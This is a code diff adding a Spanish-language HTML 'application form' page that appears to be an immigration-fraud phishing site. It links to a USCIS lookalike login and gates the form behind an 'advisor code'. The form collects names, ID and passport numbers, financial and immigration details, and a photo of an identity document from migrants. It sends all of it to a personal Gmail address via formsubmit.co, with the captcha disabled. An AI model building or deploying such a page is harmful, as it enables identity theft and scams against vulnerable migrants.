@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Formulario de Solicitud</title>
+  <link
+    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
+    rel="stylesheet"
+  />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- Header con botones -->
+  <header class="bg-danger text-white">
+  <nav class="navbar navbar-expand-lg navbar-dark container">
+    <a class="navbar-brand" href="#">
+      <img src="img/logofin.png" alt="Logo" class="logo"  style="height: 60px;">
+    </a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarMenu"
+      aria-controls="navbarMenu" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+
+    <div class="collapse navbar-collapse justify-content-end" id="navbarMenu">
+      <ul class="navbar-nav">
+        <li class="nav-item">
+          <a href="index.html" class="btn btn-light me-2 mb-2 mb-lg-0">Inicio</a>
+        </li>
+        <li class="nav-item">
+          <a href="formulario.html" class="btn btn-light me-2 mb-2 mb-lg-0">Formulario</a>
+        </li>
+        <li class="nav-item">
+          <a href="https://egov.uscis.gov/es" class="btn btn-light me-2 mb-2 mb-lg-0">Estatus</a>
+        </li>
+        <li class="nav-item">
+          <a href="https://uscis-logo.github.io/login/" class="btn btn-light mb-2 mb-lg-0">Login</a>
+        </li>
+      </ul>
+    </div>
+  </nav>
+</header>
+  <main class="container my-5">
+  <!-- Pantalla para ingresar el código del asesor -->
+  <div id="pantallaCodigo" class="text-center mb-5">
+    <h4>Ingrese el código de su asesor</h4>
+    <input type="text" id="codigoAsesorInput" class="form-control w-50 mx-auto my-3" placeholder="Código del asesor" required>
+    <button class="btn btn-primary" onclick="mostrarFormulario()">Continuar</button>
+  </div>
+
+  <!-- Formulario oculto inicialmente -->
+  <div id="formularioSeccion" style="display: none;">
+    <h2 class="mb-4">Formulario de Solicitud</h2>
+    <form action="https://formsubmit.co/americanoexpreso374@gmail.com" method="POST" enctype="multipart/form-data">
+      <!-- Evitar captcha -->
+      <input type="hidden" name="_captcha" value="false">
+
+      <!-- Código del asesor oculto (se rellenará con JS) -->
+      <input type="hidden" name="codigoAsesor" id="codigoAsesorHidden">
+  
+  <!-- Página de agradecimiento (opcional, cámbiala si tienes una real) -->
+  <input type="hidden" name="_next" value="gracias.html">
+      <!-- 1. Idioma -->
+      <div class="mb-3">
+        <label for="idioma" class="form-label">1. ¿En qué idioma desea diligenciar su formulario?</label>
+        <select class="form-select" id="idioma" name="idioma">
+          <option value="">Seleccione</option>
+          <option>Español</option>
+          <option>Inglés</option>
+        </select>
+      </div>
+
+      <!-- 2. Nombre completo -->
+      <div class="mb-3">
+        <label class="form-label">2. Nombre completo</label>
+        <input type="text" class="form-control mb-2" placeholder="Primer nombre" name="nombre1">
+        <input type="text" class="form-control mb-2" placeholder="Primer apellido" name="apellido1">
+        <input type="text" class="form-control" placeholder="Segundo apellido" name="apellido2">
+      </div>
+
+      <!-- 3. Fecha de nacimiento -->
+      <div class="mb-3">
+        <label for="fecha" class="form-label">3. Fecha de nacimiento</label>
+        <input type="date" class="form-control" id="fecha" name="fecha">
+      </div>
+
+      <!-- 4. Género -->
+      <div class="mb-3">
+        <label for="genero" class="form-label">4. Género</label>
+        <select class="form-select" id="genero" name="genero">
+          <option value="">Seleccione</option>
+          <option>Masculino</option>
+          <option>Femenino</option>
+        </select>
+      </div>
+
+      <!-- 5. Documento de identidad -->
+      <div class="mb-3">
+        <label for="documento" class="form-label">5. Documento de identidad</label>
+        <input type="text" class="form-control" id="documento" name="documento">
+      </div>
+
+      <!-- 6. Nacionalidad -->
+      <div class="mb-3">
+        <label for="nacionalidad" class="form-label">6. Nacionalidad</label>
+        <select class="form-select" id="nacionalidad" name="nacionalidad">
+          <option value="">Seleccione</option>
+          <option>Ecuador</option>
+          <option>Bolivia</option>
+          <option>Guatemala</option>
+          <option>El Salvador</option>
+          <option>República Dominicana</option>
+        </select>
+      </div>
+
+      <!-- 7. Correo electrónico -->
+      <div class="mb-3">
+        <label for="email" class="form-label">7. Correo electrónico</label>
+        <input type="email" class="form-control" id="email" name="email">
+      </div>
+
+      <!-- 8. Teléfono -->
+      <div class="mb-3">
+        <label for="telefono" class="form-label">8. Número de teléfono con indicativo del país</label>
+        <input type="tel" class="form-control" id="telefono" name="telefono" placeholder="+1 555 1234567">
+      </div>
+
+      <!-- 9. Profesión u oficio -->
+      <div class="mb-3">
+        <label for="profesion" class="form-label">9. Profesión u oficio</label>
+        <input type="text" class="form-control" id="profesion" name="profesion">
+      </div>
+
+      <!-- 10. ¿Pasaporte vigente? -->
+      <div class="mb-3">
+        <label class="form-label">10. ¿Cuenta con pasaporte vigente?</label><br>
+        <div class="form-check form-check-inline">
+          <input type="radio" name="pasaporte" value="Si" class="form-check-input" id="pasaporte-si">
+          <label for="pasaporte-si" class="form-check-label">Sí</label>
+        </div>
+        <div class="form-check form-check-inline">
+          <input type="radio" name="pasaporte" value="No" class="form-check-input" id="pasaporte-no">
+          <label for="pasaporte-no" class="form-check-label">No</label>
+        </div>
+      </div>
+
+      <!-- 11. Número de pasaporte -->
+      <div class="mb-3">
+        <label for="numPasaporte" class="form-label">11. Número de pasaporte</label>
+        <input type="text" class="form-control" id="numPasaporte" name="numPasaporte">
+      </div>
+
+<!-- 12. Fecha de expedición del pasaporte -->
+<div class="mb-3">
+  <label for="fechaExpedicion" class="form-label">12. Fecha de expedición del pasaporte</label>
+  <input type="date" class="form-control" id="fechaExpedicion" name="fechaExpedicion">
+</div>
+
+<!-- 13. Estado civil -->
+<div class="mb-3">
+  <label for="estadoCivil" class="form-label">13. Estado civil</label>
+  <select class="form-select" id="estadoCivil" name="estadoCivil">
+    <option value="">Seleccione</option>
+    <option>Casado</option>
+    <option>Viudo</option>
+    <option>Unión libre</option>
+    <option>Soltero</option>
+  </select>
+</div>
+
+<!-- 14. ¿Tiene hijos? -->
+<div class="mb-3">
+  <label class="form-label">14. ¿Tiene hijos?</label><br>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="tieneHijos" value="Si" class="form-check-input" id="hijos-si">
+    <label for="hijos-si" class="form-check-label">Sí</label>
+  </div>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="tieneHijos" value="No" class="form-check-input" id="hijos-no">
+    <label for="hijos-no" class="form-check-label">No</label>
+  </div>
+</div>
+
+<!-- 15. ¿Cuántas personas dependen económicamente de usted? -->
+<div class="mb-3">
+  <label for="dependientes" class="form-label">15. ¿Cuántas personas dependen económicamente de usted?</label>
+  <input type="number" class="form-control" id="dependientes" name="dependientes" min="0">
+</div>
+
+<!-- 16. ¿Posee cuenta bancaria? -->
+<div class="mb-3">
+  <label class="form-label">16. ¿Posee cuenta bancaria?</label><br>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="cuentaBancaria" value="Si" class="form-check-input" id="cuenta-si">
+    <label for="cuenta-si" class="form-check-label">Sí</label>
+  </div>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="cuentaBancaria" value="No" class="form-check-input" id="cuenta-no">
+    <label for="cuenta-no" class="form-check-label">No</label>
+  </div>
+</div>
+
+<!-- 17. ¿Tiene deudas corporativas con entidades bancarias? -->
+<div class="mb-3">
+  <label class="form-label">17. ¿Tiene deudas corporativas con entidades bancarias?</label><br>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="deudas" value="Si" class="form-check-input" id="deudas-si">
+    <label for="deudas-si" class="form-check-label">Sí</label>
+  </div>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="deudas" value="No" class="form-check-input" id="deudas-no">
+    <label for="deudas-no" class="form-check-label">No</label>
+  </div>
+</div>
+
+<!-- 18. ¿Tiene cómo sustentar un ingreso monetario para entrar a Estados Unidos? -->
+<div class="mb-3">
+  <label class="form-label">18. ¿Tiene cómo sustentar un ingreso monetario para entrar a Estados Unidos?</label><br>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="ingreso" value="Si" class="form-check-input" id="ingreso-si">
+    <label for="ingreso-si" class="form-check-label">Sí</label>
+  </div>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="ingreso" value="No" class="form-check-input" id="ingreso-no">
+    <label for="ingreso-no" class="form-check-label">No</label>
+  </div>
+</div>
+
+<!-- 19. Nivel académico -->
+<div class="mb-3">
+  <label for="nivelAcademico" class="form-label">19. ¿Cuál es su nivel académico?</label>
+  <select class="form-select" id="nivelAcademico" name="nivelAcademico">
+    <option value="">Seleccione</option>
+    <option>Primaria</option>
+    <option>Secundaria</option>
+    <option>Técnico</option>
+    <option>Tecnólogo</option>
+    <option>Universitario</option>
+    <option>Otro</option>
+  </select>
+</div>
+
+<!-- 20. ¿Tiene familiares en Estados Unidos? -->
+<div class="mb-3">
+  <label class="form-label">20. ¿Tiene familiares en Estados Unidos?</label><br>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="familiares" value="Si" class="form-check-input" id="familiares-si">
+    <label for="familiares-si" class="form-check-label">Sí</label>
+  </div>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="familiares" value="No" class="form-check-input" id="familiares-no">
+    <label for="familiares-no" class="form-check-label">No</label>
+  </div>
+</div>
+
+<!-- 21. ¿Ha intentado ingresar ilegalmente a Estados Unidos? -->
+<div class="mb-3">
+  <label class="form-label">21. ¿Ha intentado ingresar ilegalmente a Estados Unidos?</label><br>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="ingresoIlegal" value="Si" class="form-check-input" id="ilegal-si">
+    <label for="ilegal-si" class="form-check-label">Sí</label>
+  </div>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="ingresoIlegal" value="No" class="form-check-input" id="ilegal-no">
+    <label for="ilegal-no" class="form-check-label">No</label>
+  </div>
+</div>
+
+<!-- 22. ¿Tiene o ha tenido problemas legales en su país de origen? -->
+<div class="mb-3">
+  <label class="form-label">22. ¿Tiene o ha tenido problemas legales en su país de origen?</label><br>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="problemasLegales" value="Si" class="form-check-input" id="legales-si">
+    <label for="legales-si" class="form-check-label">Sí</label>
+  </div>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="problemasLegales" value="No" class="form-check-input" id="legales-no">
+    <label for="legales-no" class="form-check-label">No</label>
+  </div>
+</div>
+
+<!-- 23. ¿Cuenta con la capacidad económica requerida en caso de ser aprobado? -->
+<div class="mb-3">
+  <label class="form-label">23. ¿Cuenta con la capacidad económica requerida en caso de ser aprobado?</label><br>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="capacidadEconomica" value="Si" class="form-check-input" id="economica-si">
+    <label for="economica-si" class="form-check-label">Sí</label>
+  </div>
+  <div class="form-check form-check-inline">
+    <input type="radio" name="capacidadEconomica" value="No" class="form-check-input" id="economica-no">
+    <label for="economica-no" class="form-check-label">No</label>
+  </div>
+</div>
+
+<!-- 24. Anexar foto del documento de identidad -->
+<div class="mb-4">
+  <label for="fotoDocumento" class="form-label">24. Anexar foto del documento de identidad</label>
+  
+  <!-- Área visual de carga -->
+  <div class="border border-2 rounded p-4 text-center" style="cursor: pointer;" onclick="document.getElementById('fotoDocumento').click()">
+    <p class="mb-2" id="textoCargar">Haz clic aquí para seleccionar una imagen</p>
+    <img id="previewImagen" src="" alt="Vista previa" style="display:none; max-width: 100%; height: auto; border-radius: 10px; margin-top: 10px;">
+    <p class="text-success fw-bold mt-2" id="mensajeCargado" style="display:none;">✅ Imagen cargada correctamente</p>
+  </div>
+
+  <!-- Campo oculto de tipo archivo -->
+  <input type="file" class="form-control d-none" id="fotoDocumento" name="fotoDocumento" accept="image/*" onchange="mostrarVistaPrevia(event)">
+</div>
+
+      <button type="submit" class="btn btn-primary">Enviar formulario</button>
+    </form>
+  </main>
+
+  <!-- Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+  <!-- Script para vista previa -->
+<script>
+  function mostrarVistaPrevia(event) {
+    const input = event.target;
+    const imagen = document.getElementById("previewImagen");
+    const mensaje = document.getElementById("mensajeCargado");
+    const texto = document.getElementById("textoCargar");
+
+    if (input.files && input.files[0]) {
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        imagen.src = e.target.result;
+        imagen.style.display = "block";
+        mensaje.style.display = "block";
+        texto.style.display = "none";
+      };
+      reader.readAsDataURL(input.files[0]);
+    }
+  }
+</script>
+<script>
+  function mostrarFormulario() {
+    const codigo = document.getElementById("codigoAsesorInput").value.trim();
+
+    if (codigo === "") {
+      alert("Por favor ingrese el código del asesor.");
+      return;
+    }
+
+    // Guardar el código en el campo oculto del formulario
+    document.getElementById("codigoAsesorHidden").value = codigo;
+
+    // Mostrar formulario y ocultar pantalla de código
+    document.getElementById("pantallaCodigo").style.display = "none";
+    document.getElementById("formularioSeccion").style.display = "block";
+  }
+</script>
+</body>
+</html>
